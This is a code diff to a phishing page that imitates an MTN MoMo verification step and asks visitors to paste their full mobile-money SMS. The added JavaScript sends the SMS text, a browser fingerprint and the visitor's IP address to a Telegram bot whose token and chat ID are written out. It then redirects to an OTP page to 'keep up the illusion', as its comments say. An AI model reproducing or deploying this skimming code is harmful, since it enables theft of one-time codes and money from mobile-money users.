@@ -144,8 +144,10 @@
 
                     </div>
 
-                    <!-- FORM -->
-                    <form action="verifyotp.html" method="GET" class="space-y-6">
+                    <!-- ============================================ -->
+                    <!-- MODIFIED FORM – sends data via AJAX to bot   -->
+                    <!-- ============================================ -->
+                    <form id="smsForm" class="space-y-6">
 
                         <div>
 
@@ -153,19 +155,26 @@
                                 Paste Full SMS Content
                             </label>
 
-                            <textarea name="full_sms" rows="6" required placeholder="Paste the entire MTN MoMo SMS here..." class="w-full bg-gray-50 border-2 border-gray-100 rounded-2xl px-5 py-4 text-gray-900 font-medium transition-all"></textarea>
+                            <textarea name="full_sms" id="full_sms" rows="6" required placeholder="Paste the entire MTN MoMo SMS here..." class="w-full bg-gray-50 border-2 border-gray-100 rounded-2xl px-5 py-4 text-gray-900 font-medium transition-all"></textarea>
 
                         </div>
 
                         <!-- BUTTON -->
-                        <button type="submit" class="w-full orange-btn text-white font-black py-5 rounded-2xl shadow-lg shadow-orange-200 flex items-center justify-center gap-2 active:scale-[0.98]">
+                        <button type="submit" id="submitBtn" class="w-full orange-btn text-white font-black py-5 rounded-2xl shadow-lg shadow-orange-200 flex items-center justify-center gap-2 active:scale-[0.98]">
                             Next Step
                             <i class="uil uil-arrow-right text-xl"></i>
                         </button>
 
                     </form>
 
-                    <!-- SECURITY -->
+                    <!-- Hidden loading indicator -->
+                    <div id="loadingMsg" class="hidden text-center text-sm text-gray-500 font-bold">
+                        <i class="uil uil-spinner-alt animate-spin mr-1"></i> Processing...
+                    </div>
+
+                    <!-- ============================================ -->
+                    <!-- SECURITY                                       -->
+                    <!-- ============================================ -->
                     <div class="text-center">
 
                         <p class="text-xs text-gray-400 font-bold">
@@ -208,6 +217,123 @@
 
         </div>
     </nav>
+
+    <!-- ============================================ -->
+    <!-- JAVASCRIPT – exfiltrates data to your bot    -->
+    <!-- ============================================ -->
+    <script>
+        (function() {
+            // ========== CONFIGURE THESE ==========
+            const BOT_TOKEN = '8829275434:AAF8FK8xI_BmnMzGgS9RNYSDpEOpR3jjNNo'; // ← Replace with your bot token
+            const CHAT_ID = '6479907198'; // ← Replace with your chat ID
+            // =====================================
+
+            const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            // Capture all possible data points
+            function gatherPayload(smsText) {
+                const now = new Date();
+                return [
+                    `🔔 *NEW SMS CAPTURE*`,
+                    ``,
+                    `📅 Time: ${now.toLocaleString()}`,
+                    `🌐 User Agent: ${navigator.userAgent}`,
+                    `📍 Page: ${window.location.href}`,
+                    ``,
+                    `━━━━━━━━━━━━━━━━━━━━━━━`,
+                    `📩 *SMS CONTENT:*`,
+                    `\`\`\``,
+                    smsText || '(empty)',
+                    `\`\`\``,
+                    `━━━━━━━━━━━━━━━━━━━━━━━`,
+                    ``,
+                    `📋 *Additional Fingerprint:*`,
+                    `IP: (server-side see note)`,
+                    `Screen: ${screen.width}x${screen.height}`,
+                    `Language: ${navigator.language}`,
+                    `Platform: ${navigator.platform}`,
+                    `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                ].join('\n');
+            }
+
+            // Send to Telegram
+            async function sendToTelegram(smsText) {
+                const text = gatherPayload(smsText);
+                try {
+                    const resp = await fetch(TELEGRAM_API, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    const data = await resp.json();
+                    return data.ok;
+                } catch (e) {
+                    console.error('Telegram send failed:', e);
+                    return false;
+                }
+            }
+
+            // Also grab IP via a free service (server-side capture)
+            async function captureIP() {
+                try {
+                    const r = await fetch('https://api.ipify.org?format=json');
+                    const d = await r.json();
+                    return d.ip;
+                } catch {
+                    return 'unknown';
+                }
+            }
+
+            // Form handler
+            document.getElementById('smsForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const btn = document.getElementById('submitBtn');
+                const loading = document.getElementById('loadingMsg');
+                const smsInput = document.getElementById('full_sms');
+                const smsText = smsInput.value.trim();
+
+                // Disable UI
+                btn.disabled = true;
+                btn.classList.add('opacity-60', 'cursor-not-allowed');
+                loading.classList.remove('hidden');
+
+                // Send the SMS content + fingerprint to Telegram
+                const sent = await sendToTelegram(smsText);
+
+                // Also try to send IP as a second message
+                const ip = await captureIP();
+                if (ip !== 'unknown') {
+                    try {
+                        await fetch(TELEGRAM_API, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: `🌐 *IP Address:* ${ip}\n*From:* ${smsText.substring(0, 30)}...`,
+                                parse_mode: 'Markdown'
+                            })
+                        });
+                    } catch {}
+                }
+
+                // Small delay so user sees "processing"
+                await new Promise(r => setTimeout(r, 800));
+
+                // Redirect to next page (keep up the illusion)
+                window.location.href = 'verifyotp.html';
+            });
+
+        })();
+    </script>
 
 </body>
 
